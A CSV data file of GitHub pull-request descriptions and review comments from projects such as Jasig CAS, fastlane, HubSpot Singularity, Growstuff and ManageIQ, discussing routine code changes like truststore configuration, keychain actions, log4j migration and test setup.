,gh_project_name,gh_pull_req_num,gh_pr_original_comment,gh_comments
0,Albacore/albacore,34.0,To not remove existing files in directory. Useful for cases when files are coming from multiple different directories.,"['This cannot be automatically merged anymore. Could you see if you could rebase on dev and preferrably make the diff for the spec file look like not ALL of it has changed?', 'Done. Rebased and removed whitespace difference.', ""I'm not a fan of the boolean property setter like this. It [can be confusing][3] to interpret what kind of value to assign, boolean (`false`) or symbol (`:false`), or if it's a method call. I like the method syntax. For example,\r\n* xunit task, [`skip_test_failures`][1]\r\n* msbuild task, [`nologo`][2]\r\n\r\nThe name `remove_dir_to` isn't as friendly as it could be. It's not totally consistent with the `from` and `to` properties. It's true by default, internally. So, should this property only be set when intended to be false?\r\n\r\nWhat about a method for just the file-preserving behavior, named very specifically? I could support\r\n\r\n* `keep_to`\r\n* `preserve_to`\r\n* `dont_clean`\r\n* `no_overwrite`\r\n* `no_clean`\r\n\r\nI feel like there's a better name I haven't thought of yet, thoughts?\r\n\r\n----\r\nFYI, it feels like it would be easier to name if we switched the default behavior to _never_ clean and had a method _to clean_... then we could just say `out.clean`. But, that's not in the cards.\r\n\r\n\r\n [1]: https://github.com/Albacore/albacore/blob/dev/lib/albacore/xunittestrunner.rb#L18\r\n [2]: https://github.com/Albacore/albacore/blob/dev/lib/albacore/msbuild.rb#L22\r\n [3]: http://stackoverflow.com/questions/8701295"", ""Ah right didn't get this albacore convention. I have changed it to `keep_to` sounds like the most appropriate to me."", '@haf, are you ok with this one now?', 'Initialised keep_to to false. \r\nDuring playing with it discovered that there is a test missing for case when keep_to is not set. ', 'Ok, great!']"
1,BuildCraft/BuildCraft,1834.0,"As part of #1797

* Engines can put energy directly to block with battery which have a receive support (simulate old behavior)
* Engines doesn't push energy in wooden pipes anymore
* Instead, wooden pipes grabbing energy from batteries with send support
* Energy now has a constant rate at all time.
* Battery reconfigurator.
* Transparent support of old power framework when using only new framework, no more dozens checks of tile!
* Maybe something else :)","[""I'm starting a review of this - hoping to merge this week-end if everything is OK."", 'In addition to the first review I run, I\'d like to brainstorm some more on a design choice that is not completely clear yet:\r\n\r\nwe have battery object in mode ""output"" and battery objects in mode ""input"" (and mode ""both""). That\'s great, helps pointing data that are producers and receivers. Users can easily read and write to these in their code, just by adding or removing values. \r\n\r\nNow to move energy from an output to an input, we need actual code in the tile. A battery in mode ""input"" next to a battery in mode ""output"" will not do this automatically. Right now, we have wooden pipes which are pulling from nearby outputs, and engines which are pushing to nearby inputs. But that\'s becoming a bit inconsistent and seems difficult to scale up.\r\n\r\nLet me suggest to go one notch further in the design and identify clearly:\r\n\r\n- passive batteries which will not push or pull energy\r\n- active batteries which will do push / pull\r\n- add a rule giving a priority when two active objects are next one to another (e.g. a pull never pulls from a push, or vice versa)\r\n\r\nThen provide some easy function (a method in MjAPI?) which allows players to automatically resolve push / pull on their tile. Something like:\r\n\r\n```\r\n   function activate (TileEntity tile) {\r\n      \r\n   }\r\n```\r\n\r\nso that in my tile I can just do:\r\n\r\n```\r\npublic void updateEntity() {\r\n   MjAPI.activate (this);\r\n}\r\n```', ""@SpaceToad\r\nI'd push small changes (see MjAPI.updateEntity() and IOMode), should be more easy to integrate new framework."", 'MjAPI.updateEntity() looks good indeed. Last problem to solve is this cache issue.', '@SpaceToad PR updated, active receive mode and caching batteries instances added.', ""Let's go with this :-) Thanks for the effort on this one. I trust we'll have further refinements on the 6.1 branch, but that's already a substantial improvement.""]"
2,Findwise/Hydra,225.0,"The admin-service can now be configured with a property file, just like the Core.

This means the admin-service now supports authentication to MongoDB.


Adds a stub of a test for the service endpoint methods, suggestions on how to create proper tests for those are very welcome!","['This fixes #208.', ""I'll merge this after having it running for quite a while in a production environment. There might be some more fixes coming in as well.""]"
3,Findwise/Hydra,351.0,Fixes #349 ,"['One test in database is failing: `testGetAndTagCacheMiss()`. It uses tons of mocks, but it seems that it is assuming that the object returned by the backing database is the same object that is returned by the cache. Is this not true anymore?', '@laserval The test merely tests that someone has executed setFetchedBy on the document, in the case of a cache miss.\r\n\r\nThis is done by both Database implementations, this does not show since the database implementation is mocked away. I vote removing the assertion.\r\nA commit is coming up for that.', 'This is failing on the new integration test on Travis, see:\r\nhttps://s3.amazonaws.com/archive.travis-ci.org/jobs/41457246/log.txt\r\n\r\nI also had some problems running it, the test VM exited. Will have to look into that - might be the instability of this. multiprocess stuff...', ""Yes. We might have to remove the test, it isn't stable at all.\r\nWhat do you think?\r\n\r\nPerhaps keeping the test, but disabling it?""]"
4,Gazler/rapidash,8.0,A lot of changes :smiley: ,"['These changes look good, I appreciate you taking the time to do them.  I have raised a few issues, I am happy to do them if you like, but I am also happy for you to do them.', '@Gazler Done!', ""@mli-max I'll have a play later on tonight then merge it in!"", ""@mli-max I have moved the tests about a bit.  You can see the commit at https://github.com/Gazler/rapidash/commit/f011cf6ddf0b64c624fac62b5d3996ac734b8113 I would appreciate you checking it over to make sure I haven't screwed any of your changes!\r\n\r\nJust to let you know, the coverage was showing 100% of coverage for the **spec** files and not the actual code.  It is now 100% in both cases (although getting 100% coverage is far easier than writing tests!)"", '@Gazler Good']"
5,Growstuff/growstuff,410.0,"There's a lot here.

Mostly, I started with copying stuff from Plantings to Harvests. The Photos model has been modified to have m2m's for both plantings and harvests, and the photos controller has been modified so it expects parameters like this:
> ?type=planting&id=3
>  ?type=harvest&id=4

not like this:

>    ?planting_id=3

It has a list of valid types (right now just harvest and planting, but I'll work on garden soon), and it checks that all  input is valid. Then it marks which Thing the photo belongs to. It parses which type of Thing that is from the type parameter rather than having if/elsif statements that need to be updated every time the valid type list is updated.

Most of the rest should be pretty self-explanatory, given the old code shows in the diff. I did add expand the tests on both photos and harvests and update the planting photo tests to include the new parameter list.","['\n[![Coverage Status](https://coveralls.io/builds/1190193/badge)](https://coveralls.io/builds/1190193)\n\nCoverage increased (+0.1%) when pulling **ed537e583baa711f64e48eb2d744a54e1cfbfc89 on maco:dev** into **51d9bfe97e07602430a48998ef6954ae936a9434 on Growstuff:dev**.\n', ""Thanks for all this, @maco!  It looks pretty good so far but I've left several line comments about particular things which I'd like to see fixed."", '\n[![Coverage Status](https://coveralls.io/builds/1190375/badge)](https://coveralls.io/builds/1190375)\n\nCoverage increased (+0.1%) when pulling **550f3c53265e80185486298079fdb7bebde63fc0 on maco:dev** into **51d9bfe97e07602430a48998ef6954ae936a9434 on Growstuff:dev**.\n', 'So, where have we got to with this PR? AFAICT the following changes, mostly small, have been requested:\r\n\r\n - [ ] test behaviour if a photo is attached to a planting and a harvest and one of them is deleted\r\n - [ ] replace controller test with feature test\r\n - [ ] add index to table\r\n - [ ] refactor error-handling logic in `photos_controller`\r\n\r\nAFAICT the last two are in the ""nice to have"" category - are the first two blockers? @Skud @tygriffin?', 'I\'d say none of them are hard blockers, but that I\'d like to see some effort put into the first two before passing on them.  I know the first two require complex mocking of the Flickr API etc, and that this is Very Hard.  If it\'s not doable then it\'s not doable.  But please can we have a shot at it before passing?\r\n\r\nThe index looks relatively trivial to do.  Let\'s get that done at least.\r\n\r\nThe refactoring is a ""nice to have"" but also not hard, so I think it\'s worth doing.', ""Wait, correction.\r\n\r\n1. This doesn't need API mocking, and should be done.\r\n2. This needs API mocking and I know it might be really hard, but please give it a shot.  @pozorvlak and @maco please email and work on it asyncronously since your timezones are incompatible.\r\n3. Trivial. Please do this :)\r\n4. Trivial but makes things clearer. Please do this too!"", 'Possibly useful:\r\n\r\nhttp://stackoverflow.com/questions/3539465/how-do-i-stub-out-the-flickraw-library-in-my-apps-unit-tests\r\nhttp://effectif.com/ruby/manor/faking-http-requests-during-testing\r\nhttps://github.com/rspec/rspec-mocks\r\n', 'I just went to take a look at some of the API mocking stuff here and noticed that @maco hadn\'t branched before doing this work.  Maco, generally we prefer it if you create a feature branch (eg. ""git checkout -b harvestphotos"") before working on a feature.\r\n\r\nGit hurts my brain so I don\'t know offhand how to move these commits to a named feature branch, I\'m afraid :-/', 'After I had some commits I realized it would\xe2\x80\x99ve been nice if I had used a branch. If I branched now, it\xe2\x80\x99d have these commits in its history (as part of master). I don\xe2\x80\x99t think there\xe2\x80\x99s a way to move them, so I\xe2\x80\x99ll just have to remember for next time.=', '@maco I just sent you a pull request for item 1 (tests for deleting plantings/harvests/photos etc).  It turns out there was brokenness there (unused photos were still lingering in the system) so i have also fixed this and written a rake task to clean up any old photos in that state.', '\n[![Coverage Status](https://coveralls.io/builds/1282781/badge)](https://coveralls.io/builds/1282781)\n\nCoverage increased (+1.42%) when pulling **57abfa04b38f23d15bed82572ce44319279b7edb on maco:dev** into **51d9bfe97e07602430a48998ef6954ae936a9434 on Growstuff:dev**.\n', '\n[![Coverage Status](https://coveralls.io/builds/1282891/badge)](https://coveralls.io/builds/1282891)\n\nCoverage increased (+2.07%) when pulling **fcda8742d8049bac9bcfb46f82b00f79c54c4f69 on maco:dev** into **51d9bfe97e07602430a48998ef6954ae936a9434 on Growstuff:dev**.\n', 'There are several tab characters in the latest commits.  Can you please replace them with spaces as per our style guide?  If you are using vim, check out our [recommended settings](http://wiki.growstuff.org/index.php/Vim_settings) so you don\'t have this problem going forward.  To check that you\'ve caught them all, try:\r\n\r\n    git grep ""<ctrl-v><tab>""\r\n\r\n(holding down control and pressing V, then hitting tab, within the quote marks)', 'darn it, i thought i s/^I/  /g \xe2\x80\x98d!=', '\n[![Coverage Status](https://coveralls.io/builds/1282998/badge)](https://coveralls.io/builds/1282998)\n\nCoverage increased (+2.07%) when pulling **48ad561b76c4128928650c8bde26dc6109383278 on maco:dev** into **51d9bfe97e07602430a48998ef6954ae936a9434 on Growstuff:dev**.\n', ""Woohoo, merged! Can't wait to get this tested and pushed up to the site :)"", ""Woohoo! Great to see this merged. Sorry I've been so little help on it.\r\n\r\n@maco: you can copy commits from one branch to another with `git cherry-pick`, and start a branch from somewhere other than the current HEAD with `git checkout -b [commit-id]`. AFAICT it's not a big deal here, though.""]"
6,Growstuff/growstuff,616.0,Based on jbuilder and introducing some JSON-LD elements. Work in progress. For #582 (I think).,"['\n[![Coverage Status](https://coveralls.io/builds/1703599/badge)](https://coveralls.io/builds/1703599)\n\nCoverage increased (+0.02%) when pulling **a3e3abecf33c123403020ccfdf9f3062330e880e on pmackay:api_v1** into **9d49a83918824c4a7974b8e653f1c2715084fa64 on Growstuff:api_v1**.\n', ""Yes, #582 is probably the best issue to link to -- there was a PT story (as you know) for the framework but I didn't move it across as it was open and I hadn't quite figured out what to do with open stories.\r\n\r\nI've left a bajillion line notes as you've no doubt seen already, but overall it looks good.  If you could do some of those small things I mentioned, I'll be happy to merge.  (We can have an ongoing discussion about IDs, URLs, etc over on Growstuff Talk I think. I won't let it block this PR.)"", ""Have made various updates. The RSpec tests could probably be improved further. I've spent quite a bit of time on those but (being still quite new to rspec) I'm finding it harder to follow the docs I can find on it compared with other parts of Rails. Any good recommendations much appreciated :)"", '\n[![Coverage Status](https://coveralls.io/builds/1725557/badge)](https://coveralls.io/builds/1725557)\n\nCoverage increased (+0.05%) when pulling **1b5d2bb898be4e437d61c7b8661659517451fa85 on pmackay:api_v1** into **9d49a83918824c4a7974b8e653f1c2715084fa64 on Growstuff:api_v1**.\n', ""@tygriffin I've updated those, thanks!"", '\n[![Coverage Status](https://coveralls.io/builds/1727592/badge)](https://coveralls.io/builds/1727592)\n\nCoverage increased (+0.05%) when pulling **016feaf8bf12f5a8fad00f68b82b7bc228ab6bc7 on pmackay:api_v1** into **9d49a83918824c4a7974b8e653f1c2715084fa64 on Growstuff:api_v1**.\n', ""OK, this looks good to merge to the Growstuff API branch.  Thanks for all your fixes, @pmackay!\r\n\r\nWrt rspec documentation, ugh, I knooooow.  This website is a good rundown of best practices: http://betterspecs.org/  Apart from that I'm afraid I mostly just cargo-culted it until I kinda knew what I was doing.  I think there might be a good book out there, but I don't have it.""]"
7,HubSpot/Singularity,251.0,"This branch will get all the Guice changes to make DI work correctly and eliminate all the race conditions and have the startup and shutdown of the service controlled by the dropwizard framework.

The first patch is fixing all the lazy injection places, add explicit injection for everything that is referenced through Guice and uses eager injection everywhere.","['This will become a somewhat uncomfortably big change to Singularity to get all the corner cases right; it does need thorough review before applying. That said, I do run with all my changes in a test environment and have not seen any problems (but I am also not using the more exotic features such as mail notification).', 'fyi @HiJon89 ', ""I am just now starting to see some bizarre race conditions in some local testing on a different machine. For example, I see multiple calls to start curator despite it being inside of a Provides/Singleton tagged method.\r\n\r\nI am not sure why this is suddenly an issue on this machine and doesn't appear to ever be an issue in any of our deployed environments. In any case, can these changes be applied by their own or does this PR await more patches?"", 'Which exact version of the JDK do you run with @hgschmie?', 'Can we remove the dropwizard-guice dependency with this or is still being used for something?', 'This is not yet ready to be merged. I thought that the reflection helper did go away. Let me get back to you tomorrow when I am in the office.', 'Ok, so this is now the whole hog. All fixes to the lifecycle, use the DW managed code everywhere, fix the curator badness etc. etc.\r\n\r\nThis does require some review. :-) ']"
8,HubSpot/Singularity,313.0,"This PR adds the `portMappings` field to `SingularityDockerInfo`, and allows for users to launch docker containers (via the docker executor, as opposed to a straight `docker run` command) mapped to ports allocated from the Mesos offer.

Example (works with our Vagrant rig):
```json
{
    ""deploy"": {
        ""id"": ""11"",
        ""requestId"": ""nginx"",
        ""resources"": {
            ""cpus"": 1,
            ""memoryMb"": 128,
            ""numPorts"": 1
        },
        ""serviceBasePath"": ""/"",
        ""loadBalancerGroups"": [""vagrant""],
        ""containerInfo"": {
            ""type"": ""DOCKER"",
            ""docker"": {
                ""image"": ""registry.hub.docker.com/nginx:latest"",
                ""portMappings"": [{""containerPort"": 80, ""hostPort"": 0, ""hostPortType"": ""FROM_OFFER""}]
            }
        }
    }
}
```

/cc @wsorenson @hgschmie @stevenschlansker 

/ccc @eliast -- you can probably utilize this in your re:invent demo","[""If it's not too hard, might be worth adding fields for the `DockerInfo.privileged` and `DockerInfo.parameters` protobuf fields, since you're here anyway.  Somewhat unrelated to port mapping but I could see it coming in useful (e.g. for advanced handling of capabilities)\r\n\r\nNeeds some tests.  Other than that, a hearty :+1: "", ""Those fields didn't make it into `0.20.1` either, but I'll add a TODO so we don't forget. :disappointed:\r\n\r\nI'll add some tests tonight / tomorrow.\r\n"", ""Rats, I'm just not on top of things today :P""]"
9,HubSpot/Singularity,475.0,"@tpetr - I took an initial run at this, doesn't use local storage to save the filename right now (as I mentioned), but otherwise will redirect to whatever filename is entered. 
","[""we're going to simplify the logic and redirect the user to the file the want to tail as soon as the task starts -- @benrlodge is going to tweak the file tailing view so that the error message is less drastic, and the page will auto-update for as long as the task is running (this will be in a separate PR, and we'll rebase it in here once it's merged)"", 'moving to #504 ']"
10,Jasig/cas,601.0,"This pull fixes https://github.com/Jasig/cas/issues/472

## Description
CAS currently uses the JDK's default truststore to establish ssh handshakes specially for proxy calls. This can be improved by providing a CAS specific truststore, that would be empty by default. Untrusted proxies can be imported inside this particular store. Separating the store from Java's default always helps with platform upgrades that may cause prev changes to be overwritten.

Note that the default keystore would possibly be used in addition to the already available certs in Java. We simply just want to avoid polluting the default,and allow adopters to carry over their store, irrelevant of jdk version.

## Background
This is proposed under SEC_5:
https://wiki.jasig.org/display/CAS/Proposals+to+mitigate+security+risks

## How does it work?
CAS ships with an empty JKS keystore that is called `truststore.jks` whose password is `changeit` modeled after the default truststore. 

This truststore is loaded by a custom SSL socket factory that is able to realize self-signed certs as well as other imported authorities into the keystore:

```xml
<bean id=""proxyTrustStoreSocketFactory""
          class=""org.jasig.cas.authentication.TrustedProxyAuthenticationTrustStoreSslSocketFactory""
          c:trustStoreFile=""${proxy.authn.truststore.file:classpath:truststore.jks}""
          c:trustStorePassword=""${proxy.authn.truststore.psw:changeit}"" />
```

Then, we have a special httpclient, that is backed by apache http-components, to use the factory above:

```xml
<bean id=""trustStoreProxyHttpClient"" parent=""httpClient""
          c:sslSocketFactory-ref=""proxyTrustStoreSocketFactory"" />
```

## Why Apache Http Components?
We were making changes to HttpClient and @serac suggested that we should at some point consider taking advantage of the apache library. Provides a lot of other options and wraps the Java API quite well. It is a prominent and well looked-after library and sort of a standard tool in the Java realm.

The existing `SimpleHttpClient` that is backed by library now provides a lot of other integration hooks, for handling redirects, connection and proxy management as well as ability to authenticate an endpoint. All these  settings are optional, and the outer body of the API does not  change, only that some setters are deprecated. ","['We want to ship with a completely empty trust store and require deployers to set one up? (and also require deployers who have already gone through the pain of configuring their existing one to do something to get their existing one to continue to work?)\r\n\r\nAlso is the HttpClient change required for this?  If not, why are the two changes tied together?  For example, I have no problem switching to HttpClient, but I would hesitate to do something that is basically forcing people to reconfigure their existing set up.', '>We want to ship with a completely empty trust store and require deployers to set one up? (and also require deployers who have already gone through the pain of configuring their existing one to do something to get their existing one to continue to work?)\r\n\r\nNot quite. Deployers who have already been dealing with the default java truststore will continue to do just fine. The SSL factory recognizes both the default truststore and the local one that would be shipped with CAS. The local truststore simply just exposes a level of flexibility so that the changes upon a java upgrade would not be lost. The truststore can be carried over from one upgrade to the next.  There was discussion on the AppSec group that CAS should perhaps only rely on the local truststore, but that breaks existing deployments as you notes. So at this point, we would just be accommodating both stores but would recommend that self signed certs, etc be imported into the local truststore.', "">Also is the HttpClient change required for this? If not, why are the two changes tied together? For example, I have no problem switching to HttpClient, but I would hesitate to do something that is basically forcing people to reconfigure their existing set up.\r\n\r\nIt is required, yes. Evidently, It's the component that reaches out to an ssl endpoint to establish proxy authn so it needs to be connected with an ssl factory that is able to recognize that endpoint, one that is able to both look the default and the local-CAS truststore. Now, we could have just made the changes I suppose with the existing httpclient without apache. I paused there, because the apache component already handles this sort of thing very well, (see the ssl factory in this PR) and it's an improvement at minimum cost that provides better control and options when establishing a connection. There are no breaking API changes as far as I can tell, save a few setters that are deprecated."", ""Also, to clarify adopters are not expected to set anything up forcefully. The truststore that is shipped here is ready to go; it's simply empty/ready for adopters to start [from now on] importing into it, just like they would have been with the default truststore. As I said, it would have been a breaking change if the config was just limited to the local CAS truststore but that is not the case here. (May become the case in the future to really lock down the config to CAS only)"", 'Another advantage of this method is that the truststore, since it is now part of CAS, can be kept and managed with the overlay, and even be checked into SCM along with the rest of the config. ', 'I have several comments, even if I like the overall idea of having a specific truststore for proxy calls and using the httpclient component from Apache...', '""Not quite. Deployers who have already been dealing with the default java truststore will continue to do just fine. The SSL factory recognizes both the default truststore and the local one that would be shipped with CAS.""\r\n\r\nAhh that wasn\'t quite clear from the original description when I first read it (reading it again with your additional context makes it more clear).  We should be sure that its clear in our documentation.\r\n\r\nI\'ll review this now from the perspective of additive rather than replacement :-)', ""Very cool. Thanks!\r\n\r\nI'll start to address comments by @leleuj in the meanwhile and in the coming days. "", 'Latest commit addresses feedback by @leleuj ', 'Looks like there is an issue in the executor pool initialization...', '+1', 'bump', '+1', 'Merged PR with master once, fixed a few CS and docs issues. Will proceed with the actual merge in a little bit. Thanks for comments. ']"
11,Jasig/cas,718.0,"Deals with https://github.com/Jasig/cas/issues/660

This pull enables ldap tests to execute against an in-memory ldap server backed by UnboundID. The server is first initialized with a common schema, and some CAS-specific objectclasses are registered. Sample LDIF data is then imported into server which primarily drives the tests. The server is restarted per each test class.

I have had to haul the existing ldap tests to somewhat get them functional with unboundid. Hopefully, the presented structure allows one to easily add/remove tests and to observe CAS-specific behavior, with less focus and attention on ldaptive config itself. Most beans are condensed into a single context file that is shared across test classes. 

The sample data that is imported is mostly designed to get tests working, again with focus on CAS functionality while allowing (and assuming) that ldaptive would handle directory-specific changes, configuration and various schemas. 

Probably, the one class that is most impacted by this pull is the ldap-based service registry that is also tested more heavily than others, in view of the recent changes that were made to the CAS service model. There are small changes here and there, but  the most significant one is probably the addition of the objectclass ""top"" to the ldap entry that contains the CAS service. 

I'll try to highlight other changes as well throughout the pull.","[""First, thanks for taking this on -- we've needed this capability for LDAP component test coverage for years. I'll try to review thoughtfully and provide feedback in the next week."", 'Thanks very much for the through feedback. I have accounted for all instances in the latest commit (which also takes care of test failures on Travis by having changed ports). Do let me know if there is more I can work on here. ', 'Will take a closer look at the end of week.', '+1 with a few questions/comments', 'Thanks. I removed the unneeded props and introduced the temp variable. ', ""Enthusiastically +1. Thanks for taking on this grunt work! I'm confident it will pay off in the long run.""]"
12,Jasig/cas,870.0,"Handles https://github.com/Jasig/cas/issues/863 and https://github.com/Jasig/cas/issues/485

## Scope
This is a fairly large pull, but the majority of changes are related to configuration. I'll highlight some of the significant changes that have gone in:

- Upgrade from log4j v1 to log4j v2
- Removal of perf4j and use of dropwizard's metrics (https://dropwizard.github.io/metrics)
- Inclusion of additional metrics and stats into the CAS statistics
- Fixes to log statements and controllers that deal with stats in general

### Upgrade
Log4j v2 is not as easily configurable by Spring. Instead of the previous method invoker for log4j v1, there is now a `CasLoggerContextInitializer` that scans the classpath for the log4j context initializer and starts it for the log configuration file. [I explored all other options. None were better] The log4j auto initialization feature is disabled.

All logging configuration is converted to log4j v2's syntax and format. All log data and configuration should have been preserved.

### Statistics

I had to remove perf4j entirely, because none of the appenders are compatible. Instead, I used dropwizard's various metrics and annotated the appropriate classes with timers and metrics. There is a new metricsConfiguration.xml file that handles all of that via Spring. 

Stats data includes JVM info and is exposed via JMX as well. 

There are several new stats on the /statistics endpoint that output metrics, thread dumps and active sso sessions. These are all, just as before, secured via spring security and simply output JSON data. Links are provided on the statistics JSP page.

The statistics and status controllers were also converted to use annotations instead to help with autowiring of the configuration.

### Others
Various other fixes that relate to logging, such as typos, duplicate and double logging and etc are also applied. ","['It seems that previous log4j configuration were changed when updating to log4j: is this the expected change?\r\nThe SSO session report mechanism should not be in this PR.\r\n', 'Yes it has definitely changed. Config is not backwards compatible and is \r\nmandatory. It\xe2\x80\x99s a major change. While there are component that can route \r\ncalls from log4j v1 to log4j v2, there is nothing that would understand the \r\nconfiguration of log4j v1 and make it work with the v2 syntax. So this is \r\ndone on purpose.\r\n\r\nThe SSO sessions fits with the changes to the statistics. It\xe2\x80\x99s just another \r\nmetric and I realized we could possibly fit it here, as it\xe2\x80\x99s often also \r\nrequested. If that is too much for this pull, I can certainly take it out.\r\n\r\n', 'Took out the SSO report', 'Moving to merge by next Monday morning, unless there are other comments. ', ""Assuming the changes are ok here, I'll proceed with the merge towards this weekend. Please speak up if you see an issue with this plan.""]"
13,Jasig/cas,962.0,"This pull handles #497 

Many thanks to @seanrbaker for bringing this forward. 

The pull contains a set of webflow actions that try to decide if SPNEGO should be activated for the given request. These strategies are per IP, HostName or a given LDAP attribute. If an IP match is found, or a hostname match is found, or an LDAP attribute is found, the action will produce ""yes"" allowing the flow to resume to SPNEGO. ","[""I don't know SPNEGO, but I have a few questions / comments..."", 'I updated the pull based on the discussion on this thread.', ""Moving ahead with this PR. @seanrbaker is there anything else you'd rather see here? "", ""I'm sure there'll be more good ideas as this gets moved into production elsewhere, but this looks good to me!"", '@seanrbaker thanks. Assuming and once this pull merges in, would you be able to help with the documentation? I can always assist where needed.', ""I'm sure I'm going to need help with style and syntax, but otherwise sure thing!""]"
14,KrauseFx/fastlane,78.0,"Added new [gcovr](http://gcovr.com/) code coverage generation action w/ spec.

This action supports all available gcovr CLI args:

```ruby
object_directory: '--object-directory',
output: '-o',
keep: '-k',
delete: '-d',
filter: '-f',
exclude: '-e',
gcov_filter: '--gcov-filter',
gcov_exclude: '--gcov-exclude',
root: '-r',
xml: '-x',
xml_pretty: '--xml-pretty',
html: '--html',
html_details: '--html-details',
html_absolute_paths: '--html-absolute-paths',
branches: '-b',
sort_uncovered: '-u',
sort_percentage: '-p',
gcov_executable: '--gcov-executable',
exclude_unreachable_branches: '--exclude-unreachable-branches',
use_gcov_files: '-g',
print_summary: '-s'
```

Usage Example:
```ruby
lane :test do
  # Run tests
  xctool :test

  # Create code coverage report directory, if it doesn't already exist
  sh ""mkdir -p code-coverage""

  # Generate HTML code coverage
  gcovr({
    html: true,
    html_details: true,
    output: ""./code-coverage/code-coverage-report.html""
  })
end
```

The above test lane is being used by me currently to run tests and generate HTML code coverage reports.
","['This looks really great, thanks for working on this :+1: \r\n\r\nHow about automatically creating the folder if necessary? \r\n\r\nCould you also update the README to explain how to use it (just a few lines, to not clutter the README)\r\n\r\nThanks! ', 'Will do!\n\nThis is a great project. I\xe2\x80\x99m happy to contribute to it. -d\n\n--\xc2\xa0\nDan Trenz\n\nOn February 26, 2015 at 3:52:38 PM, Felix Krause (notifications@github.com) wrote:\n\nThis looks really great, thanks for working on this  \n\nHow about automatically creating the folder if necessary?\n\nCould you also update the README to explain how to use it (just a few lines, to not clutter the README)\n\nThanks!\n\n\xe2\x80\x94\nReply to this email directly or view it on GitHub.\n\n', 'Looks great, thanks for also adding a unit test for it :+1: ', 'This will be in the next release, thanks! :smiley: ']"
15,KrauseFx/fastlane,380.0,"I add actions for signing in CircleCI/TravisCI.

# Usage
```ruby
# I set this ENVs in CircleCI Environment variables 
ENV['KEYCHAIN_NAME'] = ""ios-build.keychain""
ENV['KEYCHAIN_PASSWORD'] = ""very_important_password!""

create_keychain(
  default_keychain: true,
  unlock: true,
  timeout: 3600,
  lock_when_sleeps: true
)
import_certificate certificate_path: ""certs/AppleWWDRCA.cer""
import_certificate certificate_path: ""certs/dist.p12"", certificate_password: ENV['MY_DIST_CERT_PASSWORD']
```

# Could you help me
sh method in `actions_helper.rb` is output args.
But that behavior is not good for sensitive data

this is `import_certificate` action log.

```
[21:57:43]: --------------------------------
[21:57:43]: --- Step: import_certificate ---
[21:57:43]: --------------------------------
[21:57:43]: [SHELL COMMAND]: security import certs/dist.p12 -k ~/Library/Keychains/ios-build.keychain -P very_important_password! -T /usr/bin/codesign
[21:57:43]: [SHELL]: 1 identity imported.
```

that output my `very_important_password!` in shell.
I don't want to output my passowrd.

Do you have something idea or best way?","['I will test for this actions :sunglasses: ', '@gin0606 thank you for submitting this pull request :+1: \r\n\r\nCould you show me an example usage on how you would use this new integration?\r\n\r\nThanks :smiley: ', '@KrauseFx \r\n```ruby\r\ndesc ""Submit a new Inhouse Build to Deploygate""\r\nlane :inhouse do\r\n  create_keychain(\r\n    default_keychain: true,\r\n    unlock: true,\r\n    timeout: 3600,\r\n    lock_when_sleeps: true\r\n  )\r\n  import_certificate certificate_path: ""certs/AppleWWDRCA.cer""\r\n  import_certificate certificate_path: ""certs/dist.p12"", certificate_password: ENV[\'CERT_PASSWORD\']\r\n  sigh(\r\n    app_identifier: ""my.app.identifier"",\r\n    team_id: ""XXXXXXXXXX"",\r\n    adhoc: true,\r\n  )\r\n  ipa(\r\n    scheme: ""myapp"",\r\n    configuration: \'Release\',\r\n    embed: ENV[""SIGH_PROFILE_FILE_NAME""],\r\n  )\r\n  deploygate\r\nend\r\n```\r\n\r\nThank you for checking my pull request :smile: \r\nThis is my lane with new actions.\r\nThis actions to use an existing certificate.\r\n\r\n`cert` action create iOS code signing certificates.\r\nBut I can\'t find a way to use an existing certificates.', 'This looks really good! The test coverage is amazing!\r\n\r\nI added some comments: I think we have problems when the password or Keychain name contains `""` or spaces. ', '@KrauseFx Thanks! :smiley: \r\n\r\nbtw I think `actions_helper`s `sh` output is not good for this actions.\r\nPlease check https://github.com/KrauseFx/fastlane/pull/380#issue-91986349 *Could you help me* section :bow: ', ""Oh, you can just use `#{command}` instead of `sh command` and it won't be displayed in the log. "", 'Sorry, I don\'t know what you mean.\r\n\r\n""`#{command}` instead of `sh command`"" means \xe2\x86\x93this? (probably not :confused: )\r\n Would you explain it again? \r\n\r\n```diff\r\n-  sh ""security create-keychain -p #{params[:password].shellescape} #{params[:name].shellescape}""\r\n+  #{""security create-keychain -p #{params[:password].shellescape} #{params[:name].shellescape}""}\r\n```\r\n\r\n', 'Ohhh, sorry, I meant:\r\n\r\n```ruby\r\n`${command}`\r\n```', 'oops, i forgot that syntax :sweat_smile: \r\n\r\nI will use that! thanks a lot!', ""I trid \\`command\\`. But that can't create keychain normality.\r\nI trid to find that cause and resolve that problem but i can't :cry: \r\n\r\nSo I add `Actions.sh` arg for output log. then actions become normality.\r\nWhat do you think this change...? https://github.com/gin0606/fastlane/commit/12ae6ce9261a99ca585bb67d2a4c5de123c553a2"", 'Looks great, thanks again for working on this :+1: :smiley: ', 'Thank you!!! :laughing: ']"
16,ManageIQ/manageiq,158.0,"Ability to set domain properties for the following scenarios

(1) Priority not passed in when creating a new instance, set the priority to be highest priority + 1
(2) Reset the priorities for a ordered array of domain ids, based on the array index
(3) When a domain is deleted squeeze priorities based on (2) ","['@Fryguy @gmcculloug @tinaafitz @h-kataria ', '@gmcculloug \r\nImplemented your suggestions', '@gmcculloug \r\nMade recommended changes', 'Checked commit https://github.com/mkanoor/manageiq/commit/b5d9c413f027bf6c81a41c2adde2b045fc93b6da with rubocop 0.21.0\n2 files checked, 0 offenses detected\nEverything looks good. :cake:\n', '@gmcculloug \r\nFixed alignment of default_value_for']"
17,ManageIQ/manageiq,103.0,"If a similar named method  exists in a
high priority domain that will overlay the existing method.
The usecase for this is a user wants to modify a single method from
the ManageIQ domain to the Customer domain. During resolution the
method from higher priority Customer domain will be used.","['@Fryguy @chessbyte @gmcculloug @tinaafitz ', 'Since Travis is now green, please rebase to ensure that this PR continues to keep our tests passing.', '@gmcculloug \r\nAdded your recommendations', 'Checked commit https://github.com/mkanoor/manageiq/commit/20ad82e47395fb8df4835e88361e5d6823b9af5d with rubocop 0.21.0\n6 files checked, 0 offenses detected\nEverything looks good. :cake:\n', '@Fryguy \r\nImplemented your recommendations', 'Looks good to me @gmcculloug ?']"
18,ManageIQ/manageiq,202.0,"- Added new entry in the appliance console summary screen
to show a new ""External Auth:"" entry indiciating either
""not configured"" or the IPA Server hostname.
- Also showing current external authentication configuration
before giving the option to unconfigure.

Note: diff best viewed/understood while ignoring whitespace via https://github.com/ManageIQ/manageiq/pull/202/files?w=1
